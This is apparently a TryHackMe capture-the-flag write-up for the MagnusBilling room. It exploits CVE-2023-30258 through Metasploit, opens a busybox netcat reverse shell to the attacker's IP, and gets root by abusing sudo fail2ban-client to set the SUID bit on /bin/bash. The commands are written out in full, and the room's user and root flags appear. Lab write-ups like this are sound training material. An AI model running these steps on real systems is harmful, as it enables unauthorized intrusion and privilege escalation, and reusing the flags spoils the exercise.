# MagnusBilling — TryHackMe CTF Writeup
**CVE:** CVE-2023-30258 | **Difficulty:** Medium | **OS:** Linux (Debian)

---

## Target Information

| Field | Value |
|---|---|
| Target IP | 10.48.173.21 |
| Attacker IP | 10.48.89.5 |
| Web App | MagnusBilling (VoIP Billing) |
| User Flag | `THM{4a6831d5f124b25eefb1e92e0f0da4ca}` |
| Root Flag | `THM{33ad5b530e71a172648f424ec23fae60}` |

---

## Phase 1 — Reconnaissance

### Port Scan (nmap -p-)

```bash
nmap -p- 10.48.173.21
```

**Open Ports:**

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |
| 3306 | MySQL |
| 5038 | Unknown (Asterisk AMI) |

### Service Version Scan

```bash
nmap -sC -sV -p22,80,3306 10.48.173.21
```

**Key Findings:**
- Port 80: Apache 2.4.62 running **MagnusBilling** at `/mbilling/`
- Port 3306: MariaDB (unauthorized access blocked)
- OS: Linux Debian

### Directory Enumeration (Gobuster)

```bash
gobuster dir -u http://10.48.173.21 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**Notable Results:**
- `/index.php` → redirects to `/mbilling/`
- `/robots.txt` → disallows `/mbilling/`
- Most interesting paths returned 403 Forbidden
- No significant exploitable endpoints found via gobuster

---

## Phase 2 — Initial Access (CVE-2023-30258)

### Vulnerability

MagnusBilling contains an **unauthenticated Remote Code Execution** vulnerability in its ICEPAY payment module. An attacker can inject OS commands without any authentication.

### Exploit via Metasploit

```bash
msfconsole
search magnus
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set LHOST 10.48.89.5
set RHOST 10.48.173.21
run
```

**What happened:**
1. MSF confirmed the target is vulnerable via a sleep-based command injection test (8 second delay verified)
2. PHP meterpreter payload sent and executed
3. Meterpreter session opened: `10.48.89.5:4444 → 10.48.173.21:33276`
4. Landed in `/var/www/html/mbilling/lib/icepay/` as user `asterisk`

### Upgrading to Stable Shell

Meterpreter shell was unstable, so dropped to a raw shell and caught a proper reverse shell:

**On victim (inside meterpreter shell):**
```bash
busybox nc 10.48.89.5 4445 -e /bin/bash
```

**On attacker:**
```bash
nc -nlvp 4445
```

**Upgrade to full TTY:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Phase 3 — Enumeration as `asterisk`

### Navigate and grab user flag

```bash
cd /home/magnus
cat user.txt
# THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

### Check sudo privileges

```bash
sudo -l
```

**Output:**
```
Defaults!/usr/bin/fail2ban-client !requiretty
User asterisk may run the following commands:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

**Key observations:**
- Can run `fail2ban-client` as **any user including root**
- **No password required**
- `!requiretty` means it works even from a non-interactive reverse shell

---

## Phase 4 — Privilege Escalation via fail2ban-client

### Why this works

fail2ban jails execute shell commands (called **actions**) as **root** when an IP ban is triggered. Since we control `fail2ban-client` as root, we can create a custom jail with a malicious action that runs any command as root.

### Check active jails

```bash
sudo fail2ban-client status
```

**8 active jails found:**
`ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd`

### Failed attempt — modifying existing jail

```bash
sudo fail2ban-client set sshd actionban "chmod u+s /bin/bash"
# ERROR: Invalid command 'actionban' (no set action or not yet implemented)
```

Direct `actionban` on an existing jail failed — need to specify the action name first.

### Successful approach — GTFOBins fresh jail method

**Step 1: Create a new blank jail**
```bash
sudo fail2ban-client add x
# Output: Added jail x
```

**Step 2: Add an action slot inside jail x**
```bash
sudo fail2ban-client set x addaction x
# Output: x
```

**Step 3: Set the malicious actionban**
```bash
sudo fail2ban-client set x action x actionban "chmod u+s /bin/bash"
# Output: chmod u+s /bin/bash  ← confirms it was set
```

**Step 4: Start the jail**
```bash
sudo fail2ban-client start x
# Output: Jail started
```

**Step 5: Trigger the ban (forces actionban to execute as root)**
```bash
sudo fail2ban-client set x banip 999.999.999.999
# Output: 1  ← ban applied, action executed
```

**Step 6: Verify SUID bit was set**
```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root  ← 's' = SUID set ✅
```

**Step 7: Spawn root shell**
```bash
/bin/bash -p
# -p flag preserves the root EUID
id
# uid=1001(asterisk) gid=1001(asterisk) euid=0(root)
```

> The `euid=0(root)` confirms effective root — we have root privileges.

### Grab root flag

```bash
cd /root
cat root.txt
# THM{33ad5b530e71a172648f424ec23fae60}
```

---

## Attack Chain Summary

```
Recon (nmap + gobuster)
        │
        ▼
CVE-2023-30258 — Unauthenticated RCE via MagnusBilling ICEPAY module
        │
        ▼
Meterpreter session → busybox reverse shell → PTY upgrade
        │
        ▼
asterisk user — sudo NOPASSWD on fail2ban-client
        │
        ▼
Create jail x → set actionban = "chmod u+s /bin/bash" → banip triggers action as root
        │
        ▼
/bin/bash -p → euid=0(root) → root.txt
```

---

## Key Concepts Learned

| Concept | Details |
|---|---|
| Unauthenticated RCE | CVE-2023-30258 exploits command injection in MagnusBilling without login |
| PTY Upgrade | `python3 pty.spawn` + `stty raw -echo; fg` for stable interactive shell |
| sudo -l enumeration | Always check what binaries a user can run as root |
| fail2ban jail | A ruleset that monitors logs and runs shell commands (actions) as root on ban trigger |
| SUID privesc | Setting `u+s` on `/bin/bash` lets any user run it with root EUID via `-p` flag |
| GTFOBins | Reference for abusing sudo binaries — fresh jail method bypasses existing jail restrictions |

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and service enumeration |
| gobuster | Web directory/file enumeration |
| Metasploit | Automated exploitation of CVE-2023-30258 |
| busybox nc | Stable reverse shell from meterpreter |
| python3 pty | TTY upgrade |
| fail2ban-client | Privilege escalation vector |

---

*Room: MagnusBilling — TryHackMe*